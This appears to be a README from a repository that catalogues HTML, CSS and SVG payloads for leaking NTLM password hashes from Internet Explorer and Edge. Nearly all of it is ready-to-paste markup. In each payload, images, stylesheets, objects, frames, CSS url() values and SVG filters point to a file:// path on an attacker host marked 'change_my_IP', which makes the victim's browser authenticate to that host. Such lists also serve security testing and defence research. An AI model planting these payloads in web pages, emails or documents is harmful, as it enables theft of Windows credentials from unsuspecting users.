# Leak-NTLM-hash-via-HTML
List of HTML tags for leak NTLM hash for Internet Explorer and Edge.
Based on https://github.com/cure53/HTTPLeaks.

## Body tags

### Link 
```html
<link rel="stylesheet" href="file://change_my_IP/link-stylesheet" /> <--only for Edge-->
```

### Body 
```html
<body background="file://change_my_IP/body-background">
```

### Table 
```html
<table background="file://change_my_IP/table-background">
```

### Img 
```html
<img src="file://change_my_IP/img-src">
<img lowsrc="file://change_my_IP/img-lowsrc"> <--only for IE-->
```

### Image
```html
<image src="file://change_my_IP/image-src">
```]

### Form
```html
<input type="image" src="file://change_my_IP/input-src" name="test" value="test">
<isindex src="file://change_my_IP/isindex-src" type="image"> <--only for IE-->
```

### Multi
```html
<bgsound src="file://change_my_IP/bgsound-src"></bgsound> <--only for IE-->
<video src="file://change_my_IP/video-src"> <--only for Edge-->
<audio src="file://change_my_IP/audio-src"></audio> <--only for Edge-->
<video poster="file://change_my_IP/video-poster" src="file://change_my_IP/video-poster-2"></video>
```

### Object
```html
<object classid="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"> 
  <param name="DataURL" value="file://change_my_IP/object-param-dataurl">
</object>
<--only for IE-->
```

```html
<object classid="clsid:6BF52A52-394A-11d3-B153-00C04F79FAA6"> 
    <param name="URL" value="file://change_my_IP/object-param-url">
</object>
<--only for IE, by click yes onload or play click play button-->
```

### Script
```html
<script src="file://change_my_IP/script-src"></script>
```

### Frame
```html
<iframe src="view-source:file://change_my_IP/iframe-src-viewsource"></iframe> <--only for Edge-->
<iframe src="javascript:'&lt;iframe src=&quot;javascript:\&apos;&lt;img src=file://change_my_IP/iframe-javascript-src-2&gt;\&apos;&quot;&gt;&lt;/iframe&gt;'"></iframe> <--only for Edge-->
```

 ### Style
 ```html
 <b style="
       list-style-image: url&#40;file://change_my_IP/inline-css-list-style-image&#41;;
       background-image: url&lpar;file://change_my_IP/inline-css-background-image&rpar;;
       border-image-source: url(file://change_my_IP/inline-css-border-image-source);
       cursor: url(file://change_my_IP/inline-css-cursor), auto;
">MNO</b>

 <style>
    @import 'file://change_my_IP/css-import-string';
    @import url(file://change_my_IP/css-import-url);
</style>

<style>
   a::after {content: url(file://change_my_IP/css-after-content-2)}
   a::before {content: url(file://change_my_IP/css-before-content-2)}    
</style>
<a href="#">ABC</a>
<style>
    big {
       list-style-image: url(file://change_my_IP/css-list-style-image);
       background-image: url(file://change_my_IP/css-background-image);
       border-image-source: url(file://change_my_IP/css-border-image-source);
       cursor: url(file://change_my_IP/css-cursor), auto;
    }
</style>
<big>DEF</big>

<style>
    p#p1 {
        background-image: \75 \72 \6C (file://change_my_IP/css-escape-url-1);
    }
    p#p2 {
        background-image: \000075\000072\00006C(file://change_my_IP/css-escape-url-2);
    }
</style>
<p id="p1">bla</p>
<p id="p2">bla</p>
```
### SVG 
```html
<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <feImage xlink:href="file://change_my_IP/svg-feimage" />
</svg>

<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
    <rect cursor="url(file://change_my_IP/svg-cursor),auto" />
</svg>
```
```html
<svg> 
    <style>
        circle {
           fill: url(file://change_my_IP/svg-css-fill#foo);
           mask: url(file://change_my_IP/svg-css-mask#foo);
           filter: url(file://change_my_IP/svg-css-filter#foo);
           clip-path: url(file://change_my_IP/svg-css-clip-path#foo);
        }
    </style>
    <circle r="40"></circle>
</svg> 
<--only for Edge-->
```
  
  
  
